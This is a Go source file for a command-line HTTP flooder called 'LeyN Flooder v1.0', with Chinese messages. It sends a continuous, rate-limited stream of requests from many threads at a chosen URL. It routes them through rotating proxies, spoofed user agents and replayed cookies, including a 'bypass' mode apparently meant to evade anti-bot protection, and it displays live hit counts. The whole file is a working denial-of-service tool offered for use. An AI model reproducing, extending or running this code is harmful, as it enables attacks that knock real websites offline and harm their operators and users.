package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"golang.org/x/net/http2"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

const (
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorReset  = "\033[0m"
)

type Config struct {
	Proxy  string
	UA     string
	Cookie string
}

var (
	stats struct {
		Total    uint64
		LastCode int32
		Start    time.Time
	}
	configs []Config
)

func main() {
	args := parseArgs()
	loadConfigs(args.mode)
	printHeader(args)

	stats.Start = time.Now()
	go attack(args)

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	for range ticker.C {
		showStats(args.url)
		if time.Since(stats.Start) > time.Duration(args.duration)*time.Second {
			fmt.Println("\n线程结束")
			os.Exit(0)
		}
	}
}

type Args struct {
	mode     string
	url      string
	duration int
	rate     int
	threads  int
	httpVer  int
	method   string
}

func parseArgs() Args {
	if len(os.Args) < 7 {
		fmt.Printf("用法: %s <method> <url> <duration> <rate> <threads> [--http <1|2|3>] <mode>\n", os.Args[0])
		os.Exit(1)
	}

	args := Args{}
	args.method = strings.ToUpper(os.Args[1])
	args.url = os.Args[2]

	var err error
	args.duration, err = strconv.Atoi(os.Args[3])
	if err != nil {
		os.Exit(1)
	}
	args.rate, err = strconv.Atoi(os.Args[4])
	if err != nil {
		os.Exit(1)
	}
	args.threads, err = strconv.Atoi(os.Args[5])
	if err != nil {
		os.Exit(1)
	}

	args.httpVer = 1
	lastIndex := 6

	if os.Args[6] == "--http" {
		if len(os.Args) < 9 {
			os.Exit(1)
		}
		args.httpVer, err = strconv.Atoi(os.Args[7])
		if err != nil || (args.httpVer != 1 && args.httpVer != 2 && args.httpVer != 3) {
			os.Exit(1)
		}
		lastIndex = 8
	}

	args.mode = strings.ToLower(os.Args[lastIndex])
	if args.mode != "flood" && args.mode != "bypass" {
		fmt.Println("无效的模式")
		os.Exit(1)
	}
	return args
}

func loadConfigs(mode string) {
	if mode == "bypass" {
		file, _ := os.Open("config.txt")
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			parts := strings.SplitN(scanner.Text(), " ", 3)
			if len(parts) == 3 {
				configs = append(configs, Config{parts[0], parts[1], parts[2]})
			}
		}
	} else {
		proxies := readLines("proxy.txt")
		uas := readLines("ua.txt")
		for i := 0; i < len(proxies) && i < len(uas); i++ {
			configs = append(configs, Config{proxies[i], uas[i], ""})
		}
	}
}

func createClient(cfg Config, ver int) *http.Client {
	proxy, _ := url.Parse("http://" + cfg.Proxy)
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	if ver == 2 || (ver == 3 && rand.Intn(2) == 0) {
		http2.ConfigureTransport(transport)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}
}

func attack(args Args) {
	rate := time.Tick(time.Duration(1e6/args.rate) * time.Microsecond)
	sem := make(chan struct{}, args.threads)

	for {
		<-rate
		sem <- struct{}{}
		go func() {
			defer func() { <-sem }()
			sendRequest(args)
		}()
	}
}

func sendRequest(args Args) {
	cfg := configs[rand.Intn(len(configs))]
	client := createClient(cfg, args.httpVer)

	req, _ := http.NewRequest(args.method, args.url, nil)
	req.Header.Set("User-Agent", cfg.UA)
	if cfg.Cookie != "" {
		req.Header.Set("Cookie", cfg.Cookie)
	}

	resp, err := client.Do(req)
	if err == nil {
		atomic.StoreInt32(&stats.LastCode, int32(resp.StatusCode))
		resp.Body.Close()
	}
	atomic.AddUint64(&stats.Total, 1)
}

// 辅助函数
func readLines(file string) []string {
	content, _ := os.ReadFile(file)
	return strings.Split(strings.TrimSpace(string(content)), "\n")
}

func printHeader(args Args) {
	fmt.Printf("%s[INFO] - LeyN Flooder v1.0%s\n", ColorGreen, ColorReset)
	fmt.Printf("%sTitle: %s\nLoad: %d\nMethod: %s / %s%s\n",
		ColorYellow, getTitle(args.url), len(configs), args.mode, args.method, ColorReset)
}

func showStats(url string) {
	fmt.Printf("\033[2J\033[H")
	fmt.Printf("%s[STATUS] - {%d - %d}%s\n",
		ColorYellow,
		atomic.LoadInt32(&stats.LastCode),
		atomic.LoadUint64(&stats.Total),
		ColorReset)
}

func getTitle(url string) string {
	resp, _ := http.Get(url)
	defer resp.Body.Close()
	if body, _ := io.ReadAll(resp.Body); strings.Contains(string(body), "<title>") {
		return strings.Split(strings.Split(string(body), "<title>")[1], "</title>")[0]
	}
	return "Unknown"
}
